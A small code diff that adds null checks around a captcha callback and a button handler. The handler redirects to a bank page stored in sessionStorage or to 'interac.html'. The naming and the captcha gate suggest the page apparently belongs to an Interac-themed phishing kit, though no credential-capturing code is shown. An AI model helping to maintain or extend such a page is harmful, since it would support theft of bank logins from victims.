@@ -37,15 +37,19 @@
 <script>
     function onCaptchaSuccess(token) {
         var btnGo = document.getElementById('btnGo');
-        btnGo.classList.add('active');
+        if (btnGo) {
+            btnGo.classList.add('active');
+        }
     }
 
     document.addEventListener('DOMContentLoaded', function() {
         var btnGo = document.getElementById('btnGo');
-        btnGo.addEventListener('click', function() {
-            var target = sessionStorage.getItem('__targetBank') || 'interac.html';
-            window.location.href = target;
-        });
+        if (btnGo) {
+            btnGo.addEventListener('click', function() {
+                var target = sessionStorage.getItem('__targetBank') || 'interac.html';
+                window.location.href = target;
+            });
+        }
     });
 </script>
 <script src="security_module.js"></script>
